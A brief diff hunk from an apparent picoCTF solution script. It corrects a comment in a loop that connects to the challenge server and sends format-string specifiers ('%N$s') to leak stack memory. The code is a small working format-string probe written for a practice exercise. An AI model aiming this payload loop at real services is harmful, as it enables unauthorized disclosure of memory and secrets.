@@ -152,7 +152,7 @@ import os
 
 os.system('clear')
 
-for i in range(256): # 129 + 64 + 64
+for i in range(256): # 128 + 64 + 64
     sh = remote('saturn.picoctf.net', 63788)
     sh.recvuntil(b'>')
     sh.sendline('%' + str(i) + '$s')
